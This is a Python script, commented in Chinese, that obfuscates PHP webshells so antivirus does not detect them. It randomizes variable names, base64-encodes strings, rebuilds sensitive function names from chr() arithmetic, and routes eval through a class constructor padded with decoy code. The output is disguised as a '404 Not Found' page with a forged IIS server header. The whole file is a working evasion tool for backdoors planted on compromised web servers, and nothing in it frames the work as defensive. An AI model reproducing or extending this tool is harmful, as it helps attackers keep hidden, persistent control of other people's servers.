import argparse
import base64
import re
import time
import html
import random
# TODO: 加密混淆webshell达成免杀


def generate_random_html(num_tags):
    tags = ['div', 'p', 'span', 'h1', 'h2', 'h3']
    html_code = ''

    for _ in range(num_tags):
        tag = random.choice(tags)
        content = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(10, 20)))
        html_code += f'<{tag}>{html.escape(content)}</{tag}>'

    return html_code

# 读取文件
def read_file(file):
    with open(file, 'r') as f:
        content = f.read()
    # 去除空格
    # content = content.replace(' ', '')
    return content

def random_variable_name():
    data="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    # 随机返回5-10个字符
    length = random.randint(5, 10)
    return '$'+''.join(random.sample(data, length))

def random_string(data):
    data="base64_decode('"+base64.b64encode(data.encode('utf-8')).decode('utf-8')+"')"
    return data

# 更改变量名
def replace_php_variables(content):
    pattern = r'(\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)(?=\s*=)'
    D=re.findall(pattern, content)
    # 去重
    D=list(set(D))
    # 排序,从长到短
    D.sort(key=lambda i:len(i),reverse=True)
    for i in D:
        content=content.replace(i,random_variable_name())
    return content

# 更改字符串
def replace_php_strings(content):
    # 匹配''和""之间的字符串，不包括''和""和数字和转义字符
    pattern = r"(?<!\\)['\"](.*?)(?<!\\)['\"]"
    D=re.findall(pattern, content)
    # 去重
    D=list(set(D))
    # 去除空字符串
    D=[i for i in D if i]
    # 排序,从长到短
    D.sort(key=lambda i:len(i),reverse=True)
    for i in D:
        content=content.replace("'"+i+"'",random_string(i))
    return content

# 更改函数调用
def ChangeFunc(content):
    def deformation(func):
        # 生成随机函数名
        random_func = random_variable_name()[1:]
        template=f'function {random_func}()'
        template+="{"
        # 将函数名分割为单个字符
        func=list(func)
        # 将每个字符转化为chr()函数
        ret=0
        for i in func:
            orddata=ord(i)
            # 随机10-20中的一个数
            num=random.randint(5,16)
            orddata=orddata*num
            if ret==0:
                template+="return chr("+str(orddata)+"/"+str(num)+")"
                ret=1
            else:
                if random.randint(1,4)%4==0:
                    template+=AddComment(7,15)
                template+=".chr("+str(orddata)+"/"+str(num)+")"
        template+=";\n}"
        return {random_func:template}


    functions=['base64_decode','base64_encode','openssl_pkey_get_public','explode','openssl_public_decrypt','call_user_func','file_get_contents',]
    dicts={}
    for i in functions:
        if i in content:
            dicts[i]=deformation(i)
    for i in dicts:
        for key,value in dicts[i].items():
            # 生成随机函数名
            random_func = random_variable_name()
            # 添加函数
            tmp="<?php\n"+value +"\n"
            # 替换函数调用
            tmp+=random_func+" = "+key+"();" +"\n" +"?>\n"
            # 将函数调用替换为随机函数名
            content=content.replace(i,random_func)
            content=tmp+content

    return content

# 增加随机注释
def AddComment(l,r):
    data="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    length=random.randint(l,r)
    randomstring="/* "
    for i in range(length):
        # 随机从data中取出一个字符
        randomstring+=random.choice(data)
        # 随机生成一个数字
        num=random.randint(1,7)%4
        if num==0:
            randomstring+=" "

    randomstring+="*/"
    return randomstring

# 将eval间接调用
def eval_func(content):
    classname = random_variable_name()[1:]
    # 替换eval函数
    content = content.replace("eval(", "$" + classname + "= new " + classname + "(")
    # 匹配eval函数
    pattern_all = r'eval\(.*?\)?;'
    # D=re.findall(pattern_all, content)
    # pattern= r'eval\((.*?)\)'
    # DD=re.findall(pattern, content)
    # for i,j in zip(D,DD):
    #     # 删除匹配到的eval函数
    #     content=content.replace(i,"")
    #     data,classname=CreateClass()
    #     content=data+content
    #     content+="\n"+"$"+classname+"= new "+classname+"("+j+");"
    data=CreateClass(classname)
    content = data + content

    return content
# 调用类来间接调用
def CreateClass(random_class):
    # 随机生成类名
    template=f'<?php class {random_class}'+'''{
    public $data;
    public function __construct($data){
        @eval($data);
        if (empty($data)) {
            echo "Hello world";
        }
        //echo date('Y-m-d H:i:s');
        $this->data="Who am I";
    }
    public function __destruct(){
        echo $this->data;
        if (empty($this->data)) {
            echo "Goodbye world";
        }
        date('Y-m-d H:i:s');
    }
    function get_image_path($goods_id, $image = '', $thumb = false, $type = 'goods', $server = '')
{
    if (empty($image)) {
        return $GLOBALS['http'] . '/themes/default/images/none.gif';
    }
    $path = $GLOBALS['http'] . '/data/' . $type . '/';
    if ($thumb) {
        $path .= 'thumb/';
    }
    $path .= $image;
    return $path;
}
}'''+"\n"
    return template

# 生成垃圾函数
def CreateGarbageFunc():
    pass
# 主程序
def Confuse(content):
    content=replace_php_variables(content)
    content=replace_php_strings(content)
    # 间接调用eval
    content = eval_func(content)

    content=ChangeFunc(content)
    # print(content)
    tmpname=str(time.time()).split(".")[0]+".php"
    # 去除所有的<?php和?>标签
    content=content.replace("<?php","")
    content=content.replace("?>","")

    content = "<?php //echo '"+generate_random_html(30) +"' \n"+ content
    content='''\n<?php 
header("Content-Type: text/html;charset=utf-8");
header("Server: Microsoft-IIS/7.5");?>\n'''+content

    content = '''
        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    </body></html>\n''' + content

    with open(tmpname,"w") as f:
        f.write(content)

if __name__ == '__main__':
    args=argparse.ArgumentParser()
    args.add_argument('-f','--file',help='The file you want to confuse')
    options=args.parse_args()
    file=options.file
    content=read_file(file)
    Confuse(content)